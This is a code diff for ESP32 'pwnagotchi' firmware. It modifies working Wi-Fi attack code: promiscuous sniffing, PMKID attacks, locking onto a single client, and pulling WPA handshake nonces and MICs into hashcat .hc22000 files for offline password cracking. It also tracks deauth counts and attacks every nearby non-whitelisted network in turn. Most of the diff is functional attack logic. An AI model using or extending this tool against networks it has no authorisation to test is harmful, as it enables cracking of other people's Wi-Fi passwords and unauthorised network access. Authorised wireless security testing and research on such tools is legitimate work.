@@ -1,5 +1,4 @@
 #include <vector>
-#include <vector>
 #include <map>
 #include "WiFi.h"
 #include "esp_wifi.h"
@@ -43,14 +42,12 @@ struct FileWriteRequest {
     bool     hasMic;
 };
 
-// BUG FIX: was "const uint8_t*" which conflicts with malloc assignment
 static uint8_t *beaconFrame    = nullptr;
 static uint16_t beaconFrameLen = 0;
 static bool     beaconDetected = false;
 
 static bool    targetAPSet = false;
 static uint8_t targetBSSID[6];
-static uint8_t eapolCount = 0;
 static bool    eapolMsg[5] = {false};
 
 // Nonce / MIC capture (for hashcat output)
@@ -72,8 +69,10 @@ volatile bool wardrivingRunning    = false;
 std::vector<String> pwnedAPs;
 std::vector<String> failedClients;
 
+static uint8_t targetClientMAC[6];
+static bool    clientLocked = false;
+
 // Wardriving mode config
-static uint32_t wardrive_gps_timeout_ms = 5000;  // Default GPS timeout for wardriving task
 static unsigned long wardrive_scan_interval_ms = 30000; // Scan interval for wardriving
 
 // PCAP structures
@@ -197,23 +196,6 @@ uint8_t getEAPOLOrder(uint8_t *buf, size_t buf_len) {
         return 0;
     }
 
-    // Capture ANonce from Msg1, SNonce+MIC from Msg2
-    if (msgNum == 1 && eapol_len >= EAPOL_ANONCE_OFFSET + 32) {
-        memcpy(capturedANonce, eapol + EAPOL_ANONCE_OFFSET, 32);
-        hasANonce = true;
-
-        // Capture source address (AP MAC) — addr2 for ToDS=0,FromDS=1 (AP→STA)
-        // In practice, for Msg1, addr2 is the AP
-        // We grab the client (STA) MAC from addr1 for use in hashcat
-        memcpy(capturedClientMac, buf + 4, 6); // addr1 = DA = client
-    }
-    if (msgNum == 2 && eapol_len >= EAPOL_MIC_OFFSET + 16) {
-        memcpy(capturedSNonce, eapol + EAPOL_SNONCE_OFFSET, 32);
-        memcpy(capturedMIC,    eapol + EAPOL_MIC_OFFSET,    16);
-        hasSNonce = true;
-        hasMIC    = true;
-    }
-
     logMessage("EAPOL Message " + String(msgNum) + " detected");
     return msgNum;
 }
@@ -322,7 +304,7 @@ void wifiRTScanCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
 
         // Correct BSSID extraction based on ToDS/FromDS bits
         bool toDS   = (fc >> 8) & 0x01;
-        bool fromDS = (fc >> 8) & 0x02;  // BUG FIX: was (fc >> 8) & 0x02 — correct
+        bool fromDS = (fc >> 8) & 0x02;
         const uint8_t *pktBSSID;
         if      ( toDS && !fromDS) pktBSSID = payload + 4;
         else if (!toDS &&  fromDS) pktBSSID = payload + 10;
@@ -330,11 +312,46 @@ void wifiRTScanCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
 
         if (memcmp(pktBSSID, targetBSSID, 6) != 0) return;
 
+        // STA MAC: if ToDS, addr2 is STA; if FromDS, addr1 is STA
+        const uint8_t *staMac = toDS ? (payload + 10) : (payload + 4);
+
+        if (clientLocked) {
+            if (memcmp(staMac, targetClientMAC, 6) != 0) return; // ignore other clients
+        }
+
         uint8_t msgNum = getEAPOLOrder((uint8_t *)payload, len);
+
+        if (msgNum == 1 && !clientLocked) {
+            memcpy(targetClientMAC, staMac, 6);
+            clientLocked = true;
+            logMessage("Client locked: " + 
+                String(staMac[0],HEX) + ":" + String(staMac[1],HEX) + ":" +
+                String(staMac[2],HEX) + ":" + String(staMac[3],HEX) + ":" +
+                String(staMac[4],HEX) + ":" + String(staMac[5],HEX));
+        }
+
         if (msgNum >= 1 && msgNum <= 4) eapolMsg[msgNum] = true;
 
-        // BUG FIX: removed duplicate bounds check that appeared twice
         if (len == 0 || len > MAX_PKT_SIZE) return;
+
+        const uint8_t *eapol = llc + 8;
+        int eapol_len = (int)len - hdrlen - 8;
+        // Capture ANonce from Msg1, SNonce+MIC from Msg2
+        if (msgNum == 1 && eapol_len >= EAPOL_ANONCE_OFFSET + 32) {
+            memcpy(capturedANonce, eapol + EAPOL_ANONCE_OFFSET, 32);
+            hasANonce = true;
+
+            // Capture source address (AP MAC) — addr2 for ToDS=0,FromDS=1 (AP→STA)
+            // In practice, for Msg1, addr2 is the AP
+            // We grab the client (STA) MAC from addr1 for use in hashcat
+            memcpy(capturedClientMac, staMac, 6);
+        }
+        if (msgNum == 2 && eapol_len >= EAPOL_MIC_OFFSET + 16) {
+            memcpy(capturedSNonce, eapol + EAPOL_SNONCE_OFFSET, 32);
+            memcpy(capturedMIC,    eapol + EAPOL_MIC_OFFSET,    16);
+            hasSNonce = true;
+            hasMIC    = true;
+        }
 
         CapturedPacket *p = (CapturedPacket *)malloc(sizeof(CapturedPacket));
         if (!p) return;
@@ -375,6 +392,7 @@ static void writeHashcatFile(FileWriteRequest *req) {
     }
 
     // Build hashcat filename from pcap filename (replace .pcap → .hc22000)
+    size_t ssidLen = min((size_t)32, req->ssid.length());
     char hcFilename[80];
     strncpy(hcFilename, req->filename, sizeof(hcFilename) - 1);
     hcFilename[sizeof(hcFilename) - 1] = '\0';
@@ -434,7 +452,7 @@ static void writeHashcatFile(FileWriteRequest *req) {
     // AP MAC from BSSID, STA MAC from capturedClientMac
     toHex(req->bssid,       6,               apMacHex);
     toHex(req->clientMac,   6,               staMacHex);
-    toHex((uint8_t*)req->ssid.c_str(), req->ssid.length(), ssidHex);
+    toHex((uint8_t*)req->ssid.c_str(), ssidLen, ssidHex);
     toHex(req->anonce,      32,              anonceHex);
     toHex(req->snonce,      32,              snonceHex);
     toHex(req->mic,         16,              micHex);
@@ -555,9 +573,20 @@ bool n_pwnagotchi::begin() {
         fileWriteQueue = xQueueCreate(5, sizeof(FileWriteRequest *));
         if (!fileWriteQueue) { logMessage("Failed to create fileWriteQueue!"); return false; }
     }
-
+    xSemaphoreTake(wifiMutex, portMAX_DELAY);
     esp_wifi_set_promiscuous_rx_cb(&wifiRTScanCallback);
     esp_wifi_set_promiscuous(true);
+    xSemaphoreGive(wifiMutex);
+    allTimeDeauths += lastSessionDeauths;
+    allSessionTime += lastSessionTime;
+    allTimePeers += lastSessionPeers;
+    lastSessionDeauths = 0;
+    lastSessionCaptures = 0;
+    lastSessionPeers = 0;
+    lastSessionTime = 0;
+    saveSettings();
+    clientLocked = false;
+    memset(targetClientMAC, 0, sizeof(targetClientMAC));
 
     pwnagotchiRunning = true;
     BaseType_t r = xTaskCreatePinnedToCore(task, "PwnagotchiTask", 8192*6, NULL, 1, &pwnagotchiTaskHandle, 1);
@@ -572,34 +601,24 @@ bool n_pwnagotchi::begin() {
     return true;
 }
 
-bool n_pwnagotchi::beginWardriving(uint32_t gpsTimeoutMs) {
+bool n_pwnagotchi::beginWardriving() {
     logMessage("Initializing Wardriving mode...");
-
-    // Store GPS timeout for wardriving task
-    if (gpsTimeoutMs > 0) {
-        wardrive_gps_timeout_ms = gpsTimeoutMs;
-    }
 
     if (wifiResultsMutex == nullptr) {
         wifiResultsMutex = xSemaphoreCreateMutex();
         if (!wifiResultsMutex) { logMessage("Failed to create mutex!"); return false; }
     }
 
-    // Start WiFi in promiscuous mode for scanning only (no attack)
-    esp_wifi_set_promiscuous_rx_cb(&wifiRTScanCallback);
-    esp_wifi_set_promiscuous(true);
-
     wardrivingRunning = true;
     BaseType_t r = xTaskCreatePinnedToCore(wardrivingTask, "WardrivingTask", 8192*2, 
-                                           (void*)gpsTimeoutMs, 1, &wardrivingTaskHandle, 1);
+                                           NULL, 1, &wardrivingTaskHandle, 1);
     if (r != pdPASS) {
         logMessage("Failed to create Wardriving task!");
         wardrivingRunning = false;
         esp_wifi_set_promiscuous(false);
         return false;
     }
-    logMessage("Wardriving mode started with " + String(gpsTimeoutMs) + "ms GPS timeout.");
-    initNewPersonality();
+    logMessage("Wardriving mode started ");
     return true;
 }
 
@@ -623,8 +642,10 @@ bool n_pwnagotchi::end() {
     }
 
     // ── 2. Stop promiscuous mode ──────────────────────────────────────────────
+    xSemaphoreTake(wifiMutex, portMAX_DELAY);
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
+    xSemaphoreGive(wifiMutex);
     logMessage("[end] Promiscuous mode disabled.");
 
     // ── 3. Drain & delete packetQueue ─────────────────────────────────────────
@@ -689,8 +710,9 @@ bool n_pwnagotchi::end() {
     // ── 7. Clear tracking state ───────────────────────────────────────────────
     targetAPSet = false;
     memset(targetBSSID,       0, sizeof(targetBSSID));
-    eapolCount = 0;
     memset(eapolMsg,          0, sizeof(eapolMsg));
+    clientLocked = false;
+    memset(targetClientMAC, 0, sizeof(targetClientMAC));
 
     // Nonce / MIC globals
     hasANonce = false;
@@ -729,7 +751,7 @@ bool n_pwnagotchi::end() {
         wifiResultsMutex = nullptr;
         logMessage("[end] g_wifiRTResults cleared, mutex deleted.");
     }
-
+    saveSettings(); // Persist cleared state to flash
     logMessage("Pwnagotchi/Wardriving fully stopped and all memory released.");
     return true;
 }
@@ -739,9 +761,7 @@ bool n_pwnagotchi::end() {
 // ==========================================
 
 void wardrivingTask(void *parameter) {
-    logMessage("Wardriving task started.");
-    uint32_t gpsTimeoutMs = (uint32_t)parameter != 0 ? (uint32_t)parameter : wardrive_gps_timeout_ms;
-    
+    logMessage("Wardriving task started.");    
     while (wardrivingRunning) {
         // Copy current WiFi results under mutex protection
         if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
@@ -801,19 +821,24 @@ void task(void *parameter) {
         if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, portMAX_DELAY) == pdTRUE) {
             std::vector<wifiRTResults> localResults = g_wifiRTResults;
             xSemaphoreGive(wifiResultsMutex);
+            tot_happy_epochs += localResults.size()/2; // More networks = more happy epochs, but with diminishing returns
 
             for (auto &network : localResults) {
                 if (!pwnagotchiRunning) break;
                 if (std::find(whitelist.begin(), whitelist.end(), network.ssid) != whitelist.end()) {
                     logMessage("Skipping " + network.ssid + " - whitelisted.");
+                    tot_sad_epochs++;
                     continue;
                 }
                 ap = network;                
                 if (!networkStillExists(network.ssid, network.channel)) {
                     logMessage("Skipping " + network.ssid + " - no longer visible.");
+                    tot_sad_epochs++;
                     continue;
                 }
                 unsigned long t0 = millis();
+                clientLocked = false;
+                memset(targetClientMAC, 0, sizeof(targetClientMAC));
                 attackTask(nullptr);
                 logMessage("Attack on " + network.ssid + " done in " + String(millis()-t0) + "ms");
                 ap = {"", 0, 0, false};
@@ -850,17 +875,20 @@ void attackTask(void *parameter) {
     }
 
     for (const auto &s : pwnedAPs)     if (s == ap.ssid) return;
-    // for (const auto &s : failedClients) {
-    //     if (s == ap.ssid) {
-    //         logMessage("Skipping " + ap.ssid + " - no clients previously.");
-    //         return;
-    //     }
-    // }
+    for (const auto &s : failedClients) {
+        if (s == ap.ssid) {
+            logMessage("Skipping " + ap.ssid + " - no clients previously.");
+            tot_sad_epochs++;
+            return;
+        }
+    }
     if (!networkStillExists(ap.ssid, ap.channel)) {
         logMessage("Network " + ap.ssid + " gone before attack.");
+        tot_sad_epochs++;
         return;
     }
-
+    allTimeEpochs++;
+    tot_happy_epochs++;
     logMessage("Attacking: " + ap.ssid);
     setMoodApSelected(ap.ssid); 
 
@@ -870,10 +898,13 @@ void attackTask(void *parameter) {
         setMoodToDeauth(ap.ssid); // Show deauth mood during PMKID
         if (runPMKIDAttack(ap.bssid, ap.channel)) {
             logMessage("PMKID success: " + ap.ssid);
-            if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end())
-                pwnedAPs.push_back(ap.ssid);
+            if (std::find(pwnedAPs.begin(), pwnedAPs.end(), ap.ssid) == pwnedAPs.end()) pwnedAPs.push_back(ap.ssid);
             pwned_ap++;
             sessionCaptures++;
+            lastSessionPeers = getPwngridTotalPeers();
+            lastSessionCaptures = sessionCaptures;
+            lastSessionTime = millis();
+            tot_happy_epochs += 3;
             
             if (n_pwnagotchi_personality.sound_on_pmkid) {
                 delay(100); M5.Speaker.tone(1500,100);
@@ -979,7 +1010,6 @@ void attackTask(void *parameter) {
             }
         }
         vTaskDelay(1000 / portTICK_PERIOD_MS);
-        eapolCount = 0;
         for (int i = 0; i < 5; i++) eapolMsg[i] = false;
 
         FileWriteRequest *req = new FileWriteRequest();
@@ -1015,6 +1045,8 @@ void attackTask(void *parameter) {
         }
 
         // Drain packet queue into request
+        beaconDetected = false;
+        targetAPSet    = false;
         CapturedPacket *pkt = nullptr;
         while (xQueueReceive(packetQueue, &pkt, 10 / portTICK_PERIOD_MS) == pdTRUE)
             if (pkt) req->packets.push_back(pkt);
@@ -1033,6 +1065,10 @@ void attackTask(void *parameter) {
 
         pwned_ap++;
         sessionCaptures++;
+        lastSessionPeers = getPwngridTotalPeers();
+        lastSessionCaptures = sessionCaptures;
+        lastSessionTime = millis();
+        tot_happy_epochs += 3;
         
         if (n_pwnagotchi_personality.sound_on_handshake) {
             delay(100); M5.Speaker.tone(1500,100);
@@ -1043,19 +1079,19 @@ void attackTask(void *parameter) {
         setMoodToNewHandshake(1); // Happy mood for handshake success
         logMessage("File write queued for: " + ap.ssid);
     } else {
+        lastSessionPeers = getPwngridTotalPeers();
+        lastSessionTime = millis();
+        targetAPSet = false;
+        beaconDetected = false;
         logMessage("Handshake timeout for: " + ap.ssid);
         if (std::find(failedClients.begin(), failedClients.end(), ap.ssid) == failedClients.end())
             failedClients.push_back(ap.ssid);
         setMoodToAttackFailed(ap.ssid); // Sad mood for attack failure
     }
 
-    // Delay before next attack per personality settings
-    vTaskDelay(n_pwnagotchi_personality.delay_between_attacks / portTICK_PERIOD_MS);
-
     // Reset state
-    beaconDetected = false;
-    eapolCount     = 0;
-    targetAPSet    = false;
     hasANonce = hasSNonce = hasMIC = false;
     if (beaconFrame) { free(beaconFrame); beaconFrame = nullptr; }
+    // Delay before next attack per personality settings
+    vTaskDelay(n_pwnagotchi_personality.delay_between_attacks / portTICK_PERIOD_MS);
 }
